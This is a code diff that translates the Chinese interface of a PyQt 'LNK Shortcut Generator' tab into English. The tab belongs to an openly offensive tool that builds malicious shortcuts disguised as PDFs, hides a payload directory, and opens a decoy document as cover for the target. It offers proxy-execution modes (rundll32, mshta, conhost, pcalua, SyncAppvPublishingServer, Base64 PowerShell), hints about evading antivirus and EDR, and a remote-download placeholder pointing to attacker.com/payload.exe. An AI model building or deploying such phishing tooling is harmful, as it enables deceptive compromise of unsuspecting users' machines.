@@ -31,24 +31,25 @@ class LNKTab(QWidget):
         content_layout.setContentsMargins(20, 20, 20, 20)
         content_layout.setSpacing(12)
 
-        # --- 标题 ---
-        title = QLabel("LNK 快捷方式生成器")
+        # --- Title ---
+        title = QLabel("LNK Shortcut Generator")
         title.setObjectName("titleLabel")
         content_layout.addWidget(title)
 
         subtitle = QLabel(
-            "生成伪装为文档的恶意 LNK 快捷方式，配合隐藏目录构建完整钓鱼文件包"
+            "Generate malicious LNK shortcuts disguised as documents, "
+            "combined with a hidden directory to build a complete phishing package."
         )
         subtitle.setObjectName("subtitleLabel")
         subtitle.setWordWrap(True)
         content_layout.addWidget(subtitle)
 
-        # ===== 执行方式 =====
-        exec_group = QGroupBox("执行方式")
+        # ===== Execution Mode =====
+        exec_group = QGroupBox("Execution Mode")
         exec_layout = QVBoxLayout()
 
         mode_row = QHBoxLayout()
-        mode_row.addWidget(QLabel("执行方式:"))
+        mode_row.addWidget(QLabel("Mode:"))
         self.mode_selector = QComboBox()
         modes = get_execution_modes()
         for mode in modes:
@@ -56,7 +57,7 @@ class LNKTab(QWidget):
             if is_separator(mode):
                 idx = self.mode_selector.count() - 1
                 self.mode_selector.model().item(idx).setEnabled(False)
-        self.mode_selector.setCurrentIndex(1)  # 第一个非分隔线
+        self.mode_selector.setCurrentIndex(1)  # First non-separator
         self.mode_selector.currentIndexChanged.connect(self.on_mode_changed)
         mode_row.addWidget(self.mode_selector, 1)
         exec_layout.addLayout(mode_row)
@@ -66,50 +67,50 @@ class LNKTab(QWidget):
         self.mode_desc_label.setWordWrap(True)
         exec_layout.addWidget(self.mode_desc_label)
 
-        # Payload 相对路径（本地模式）
+        # Payload relative path (local mode)
         self.payload_path_row = QWidget()
         pp_layout = QHBoxLayout(self.payload_path_row)
         pp_layout.setContentsMargins(0, 0, 0, 0)
-        pp_layout.addWidget(QLabel("Payload路径:"))
+        pp_layout.addWidget(QLabel("Payload Path:"))
         self.payload_path_input = QLineEdit()
-        self.payload_path_input.setPlaceholderText("隐藏目录中的payload相对路径，如：data\\demo.exe")
+        self.payload_path_input.setPlaceholderText("Relative path to payload in hidden dir, e.g. data\\demo.exe")
         self.payload_path_input.setText("data\\demo.exe")
         pp_layout.addWidget(self.payload_path_input, 1)
         exec_layout.addWidget(self.payload_path_row)
 
-        # 命令/URL（远程模式）
+        # Command/URL (remote mode)
         self.remote_url_row = QWidget()
         ru_layout = QHBoxLayout(self.remote_url_row)
         ru_layout.setContentsMargins(0, 0, 0, 0)
-        ru_layout.addWidget(QLabel("命令/URL:"))
+        ru_layout.addWidget(QLabel("Command/URL:"))
         self.remote_url_input = QLineEdit()
-        self.remote_url_input.setPlaceholderText("远程文件URL或PowerShell命令")
+        self.remote_url_input.setPlaceholderText("Remote file URL or PowerShell command")
         ru_layout.addWidget(self.remote_url_input, 1)
         exec_layout.addWidget(self.remote_url_row)
 
-        # DLL导出函数（Rundll32模式）
+        # DLL export function (Rundll32 mode)
         self.dll_export_row = QWidget()
         de_layout = QHBoxLayout(self.dll_export_row)
         de_layout.setContentsMargins(0, 0, 0, 0)
-        de_layout.addWidget(QLabel("导出函数:"))
+        de_layout.addWidget(QLabel("Export Function:"))
         self.dll_export_input = QLineEdit()
-        self.dll_export_input.setPlaceholderText("DLL导出函数名")
+        self.dll_export_input.setPlaceholderText("DLL export function name")
         self.dll_export_input.setText("DllMain")
         de_layout.addWidget(self.dll_export_input, 1)
         exec_layout.addWidget(self.dll_export_row)
 
-        # 远程下载保存文件名
+        # Remote download filename
         self.dl_name_row = QWidget()
         dn_layout = QHBoxLayout(self.dl_name_row)
         dn_layout.setContentsMargins(0, 0, 0, 0)
-        dn_layout.addWidget(QLabel("保存文件名:"))
+        dn_layout.addWidget(QLabel("Save Filename:"))
         self.dl_name_input = QLineEdit()
-        self.dl_name_input.setPlaceholderText("远程下载后保存的文件名")
+        self.dl_name_input.setPlaceholderText("Filename to save after remote download")
         self.dl_name_input.setText("update.exe")
         dn_layout.addWidget(self.dl_name_input, 1)
         exec_layout.addWidget(self.dl_name_row)
 
-        # 模式提示标签（规避/DLL警告等）
+        # Mode hint label (evasion / DLL warnings, etc.)
         self.mode_hint_label = QLabel("")
         self.mode_hint_label.setWordWrap(True)
         exec_layout.addWidget(self.mode_hint_label)
@@ -117,29 +118,29 @@ class LNKTab(QWidget):
         exec_group.setLayout(exec_layout)
         content_layout.addWidget(exec_group)
 
-        # ===== 伪装设置 =====
-        disguise_group = QGroupBox("伪装设置")
+        # ===== Disguise Settings =====
+        disguise_group = QGroupBox("Disguise Settings")
         disguise_layout = QVBoxLayout()
 
         icon_row = QHBoxLayout()
-        icon_row.addWidget(QLabel("显示图标:"))
+        icon_row.addWidget(QLabel("Display Icon:"))
         self.icon_selector = QComboBox()
         self.icon_selector.addItems(get_icon_types())
         icon_row.addWidget(self.icon_selector, 1)
         disguise_layout.addLayout(icon_row)
 
         fn_row = QHBoxLayout()
-        fn_row.addWidget(QLabel("LNK文件名:"))
+        fn_row.addWidget(QLabel("LNK Filename:"))
         self.filename_input = QLineEdit()
-        self.filename_input.setPlaceholderText("如：demo.pdf.lnk")
+        self.filename_input.setPlaceholderText("e.g. demo.pdf.lnk")
         self.filename_input.setText("demo.pdf.lnk")
         fn_row.addWidget(self.filename_input, 1)
         disguise_layout.addLayout(fn_row)
 
         desc_row = QHBoxLayout()
-        desc_row.addWidget(QLabel("文件描述:"))
+        desc_row.addWidget(QLabel("Description:"))
         self.desc_input = QLineEdit()
-        self.desc_input.setPlaceholderText("鼠标悬停显示的描述")
+        self.desc_input.setPlaceholderText("Tooltip shown on hover")
         self.desc_input.setText("Document")
         desc_row.addWidget(self.desc_input, 1)
         disguise_layout.addLayout(desc_row)
@@ -147,19 +148,20 @@ class LNKTab(QWidget):
         disguise_group.setLayout(disguise_layout)
         content_layout.addWidget(disguise_group)
 
-        # ===== 诱饵文件 =====
-        decoy_group = QGroupBox("诱饵文件")
+        # ===== Decoy File =====
+        decoy_group = QGroupBox("Decoy File")
         decoy_layout = QVBoxLayout()
 
         decoy_path_row = QHBoxLayout()
-        decoy_path_row.addWidget(QLabel("诱饵文件路径:"))
+        decoy_path_row.addWidget(QLabel("Decoy Path:"))
         self.decoy_input = QLineEdit()
-        self.decoy_input.setPlaceholderText("可选：诱饵文档相对路径，如 data\\decoy.pdf")
+        self.decoy_input.setPlaceholderText("Optional: relative path to decoy document, e.g. data\\decoy.pdf")
         decoy_path_row.addWidget(self.decoy_input, 1)
         decoy_layout.addLayout(decoy_path_row)
 
         decoy_hint = QLabel(
-            "提示：设置诱饵文件后，目标双击LNK时会同时打开正常文档作为掩护"
+            "Tip: With a decoy file, the target will see a normal document open "
+            "as a cover when they double-click the LNK."
         )
         decoy_hint.setObjectName("subtitleLabel")
         decoy_hint.setWordWrap(True)
@@ -168,38 +170,38 @@ class LNKTab(QWidget):
         decoy_group.setLayout(decoy_layout)
         content_layout.addWidget(decoy_group)
 
-        # ===== 生成预览 =====
-        preview_group = QGroupBox("生成预览")
+        # ===== Generation Preview =====
+        preview_group = QGroupBox("Generation Preview")
         preview_layout = QVBoxLayout()
 
         self.preview_text = QTextEdit()
         self.preview_text.setReadOnly(True)
         self.preview_text.setMaximumHeight(150)
-        self.preview_text.setPlaceholderText("点击下方按钮预览将要生成的LNK参数和钓鱼目录结构...")
+        self.preview_text.setPlaceholderText("Click below to preview the LNK parameters and phishing directory structure...")
         self.preview_text.setStyleSheet(
             "font-family: 'Consolas','JetBrains Mono',monospace; font-size: 12px;"
         )
         preview_layout.addWidget(self.preview_text)
 
-        self.preview_btn = QPushButton("🔍 预览命令")
+        self.preview_btn = QPushButton("🔍 Preview Command")
         self.preview_btn.clicked.connect(self.preview_command)
         preview_layout.addWidget(self.preview_btn)
 
         preview_group.setLayout(preview_layout)
         content_layout.addWidget(preview_group)
 
-        # ===== 操作按钮 =====
+        # ===== Action Buttons =====
         btn_layout = QVBoxLayout()
         btn_layout.setSpacing(12)
 
-        self.generate_btn = QPushButton("🚀 生成 LNK 文件")
+        self.generate_btn = QPushButton("🚀 Generate LNK File")
         self.generate_btn.setObjectName("primaryButton")
         self.generate_btn.clicked.connect(self.generate)
         btn_layout.addWidget(self.generate_btn)
 
         content_layout.addLayout(btn_layout)
 
-        # ===== 状态 =====
+        # ===== Status =====
         self.status_label = QLabel("")
         self.status_label.setWordWrap(True)
         content_layout.addWidget(self.status_label)
@@ -208,10 +210,10 @@ class LNKTab(QWidget):
         scroll_area.setWidget(scroll_content)
         main_layout.addWidget(scroll_area)
 
-        # 初始化
+        # Initialize
         self.on_mode_changed(1)
 
-    # ---- 事件处理 ----
+    # ---- Event Handlers ----
 
     def on_mode_changed(self, index):
         mode = self.mode_selector.currentText()
@@ -223,40 +225,40 @@ class LNKTab(QWidget):
         remote = is_remote_mode(mode)
         self.payload_path_row.setVisible(not remote)
         self.remote_url_row.setVisible(remote)
-        self.dll_export_row.setVisible(mode == "Rundll32 加载DLL")
-        self.dl_name_row.setVisible(mode == "PowerShell 远程下载")
+        self.dll_export_row.setVisible(mode == "Rundll32 Load DLL")
+        self.dl_name_row.setVisible(mode == "PowerShell Remote Download")
 
-        # 动态 placeholder 和提示
+        # Dynamic placeholder and hints
         hint = ""
-        if mode == "Rundll32 加载DLL":
-            self.payload_path_input.setPlaceholderText("DLL相对路径，如：data\\payload.dll")
-            hint = "⚠️ 此模式仅适用于 DLL 文件，不能用于 EXE"
+        if mode == "Rundll32 Load DLL":
+            self.payload_path_input.setPlaceholderText("DLL relative path, e.g. data\\payload.dll")
+            hint = "⚠️ This mode only works with DLL files, not EXEs"
             self.mode_hint_label.setStyleSheet("color: #e94560; font-weight: bold;")
-        elif mode == "PowerShell 执行脚本":
-            self.payload_path_input.setPlaceholderText("PS1脚本相对路径，如：data\\script.ps1")
+        elif mode == "PowerShell Script":
+            self.payload_path_input.setPlaceholderText("PS1 script relative path, e.g. data\\script.ps1")
             self.mode_hint_label.setStyleSheet("")
-        elif mode == "MSHTA 执行HTA":
-            self.payload_path_input.setPlaceholderText("HTA文件相对路径，如：data\\payload.hta")
+        elif mode == "MSHTA Execute HTA":
+            self.payload_path_input.setPlaceholderText("HTA file relative path, e.g. data\\payload.hta")
             self.mode_hint_label.setStyleSheet("")
-        elif mode == "WScript 执行VBS":
-            self.payload_path_input.setPlaceholderText("VBS脚本相对路径，如：data\\script.vbs")
+        elif mode == "WScript Execute VBS":
+            self.payload_path_input.setPlaceholderText("VBS script relative path, e.g. data\\script.vbs")
             self.mode_hint_label.setStyleSheet("")
-        elif mode in ["Conhost 代理执行", "Pcalua 代理执行"]:
-            self.payload_path_input.setPlaceholderText("EXE相对路径，如：data\\demo.exe")
-            hint = "✅ 此模式不经过 cmd.exe，可规避部分杀软拦截"
+        elif mode in ["Conhost Proxy", "Pcalua Proxy"]:
+            self.payload_path_input.setPlaceholderText("EXE relative path, e.g. data\\demo.exe")
+            hint = "✅ Bypasses cmd.exe, can evade some AV/EDR detection rules"
             self.mode_hint_label.setStyleSheet("color: #00b894; font-weight: bold;")
-        elif mode == "SyncAppvPublishingServer 执行":
-            self.remote_url_input.setPlaceholderText("输入 PowerShell 命令")
-            hint = "✅ 不直接调用 powershell.exe，利用 App-V 组件执行"
+        elif mode == "SyncAppvPublishingServer":
+            self.remote_url_input.setPlaceholderText("Enter PowerShell command")
+            hint = "✅ Does not directly invoke powershell.exe; uses App-V component"
             self.mode_hint_label.setStyleSheet("color: #00b894; font-weight: bold;")
-        elif mode == "PowerShell Base64 命令":
-            self.remote_url_input.setPlaceholderText("输入 PowerShell 命令")
+        elif mode == "PowerShell Base64 Command":
+            self.remote_url_input.setPlaceholderText("Enter PowerShell command")
             self.mode_hint_label.setStyleSheet("")
-        elif mode == "PowerShell 远程下载":
-            self.remote_url_input.setPlaceholderText("远程文件URL，如：https://attacker.com/payload.exe")
+        elif mode == "PowerShell Remote Download":
+            self.remote_url_input.setPlaceholderText("Remote file URL, e.g. https://attacker.com/payload.exe")
             self.mode_hint_label.setStyleSheet("")
         else:
-            self.payload_path_input.setPlaceholderText("EXE相对路径，如：data\\demo.exe")
+            self.payload_path_input.setPlaceholderText("EXE relative path, e.g. data\\demo.exe")
             self.mode_hint_label.setStyleSheet("")
 
         self.mode_hint_label.setText(hint)
@@ -272,31 +274,31 @@ class LNKTab(QWidget):
         decoy = self.decoy_input.text().strip()
 
         if remote and not cmd:
-            self.preview_text.setText("⚠️ 请输入命令或URL")
+            self.preview_text.setText("⚠️ Please enter a command or URL")
             return
         if not remote and not payload_path:
-            self.preview_text.setText("⚠️ 请输入 Payload 相对路径")
+            self.preview_text.setText("⚠️ Please enter a payload path")
             return
 
         lines = []
-        lines.append(f"执行方式: {mode}")
-        lines.append(f"图标: {self.icon_selector.currentText()}")
-        lines.append(f"文件名: {self.filename_input.text()}")
+        lines.append(f"Execution Mode: {mode}")
+        lines.append(f"Icon: {self.icon_selector.currentText()}")
+        lines.append(f"Filename: {self.filename_input.text()}")
         if not remote:
-            lines.append(f"Payload路径: {payload_path}")
+            lines.append(f"Payload Path: {payload_path}")
         else:
-            lines.append(f"命令/URL: {cmd}")
+            lines.append(f"Command/URL: {cmd}")
         if decoy:
-            lines.append(f"诱饵文件: {decoy}")
+            lines.append(f"Decoy File: {decoy}")
         lines.append("")
 
-        # 目录结构预览
+        # Directory structure preview
         fn = self.filename_input.text().strip()
         base = fn.replace('.lnk', '')
         folder = base.rsplit('.', 1)[0] if '.' in base else base
         hidden_dir = "data"
 
-        lines.append("钓鱼目录结构：")
+        lines.append("Phishing directory structure:")
         lines.append(f"  {folder}/")
         lines.append(f"  ├── {fn}")
         lines.append(f"  └── {hidden_dir}/  (attrib +h +s {hidden_dir})")
@@ -323,13 +325,12 @@ class LNKTab(QWidget):
         desc = self.desc_input.text().strip()
         dll_export = self.dll_export_input.text().strip() or "DllMain"
         dl_name = self.dl_name_input.text().strip() or "update.exe"
-        hidden_dir = "data"
 
         if not remote and not payload_path:
-            self._show_error("请输入 Payload 相对路径")
+            self._show_error("Please enter a payload path")
             return
         if remote and not cmd:
-            self._show_error("请输入命令或URL")
+            self._show_error("Please enter a command or URL")
             return
 
         success, message = generate_lnk(
@@ -346,10 +347,10 @@ class LNKTab(QWidget):
 
         if success:
             self.status_label.setStyleSheet("color: #00b894; font-weight: bold;")
-            self.status_label.setText("✅ 生成成功")
+            self.status_label.setText("✅ Generation successful")
             self.preview_text.setText(message)
             if self.window():
-                self.window().statusBar().showMessage("LNK 生成成功")
+                self.window().statusBar().showMessage("LNK generated successfully")
         else:
             self._show_error(message)
 
